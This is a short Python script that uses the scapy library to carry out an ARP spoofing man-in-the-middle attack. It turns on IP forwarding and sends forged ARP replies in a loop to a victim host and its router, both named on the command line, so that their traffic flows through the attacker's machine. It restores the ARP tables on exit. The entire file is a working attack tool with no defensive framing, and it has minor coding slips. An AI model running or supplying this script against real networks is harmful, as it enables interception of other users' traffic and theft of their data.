#!/bin/python3

from scapy.all import *
from scapy.layers.l2 import *
import sys


def enable_ip_forward(file_path):
    with open(file_path, "r") as f:
        if f.read() == 1:
            return
    try:
        with open(file_path, "w") as f:
            f.write("1")
    except PermissionError:
        print("[PERMISSION ERROR]")


def arp_spoof(dest_ip, dest_mac, source_ip):
    arp_packet = Ether() / ARP(op=2, hwdst=dest_mac, pdst=dest_ip, psrc=source_ip)
    sendp(arp_packet)


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip,
                 hwdst=dest_mac, pdst=dest_ip)
    sendp(packet)


def main():
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    enable_ip_forward("/proc/sys/net/ipv4/ip_forward")

    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        sys.exit(0)


if __name__ == "__main__":
    main()
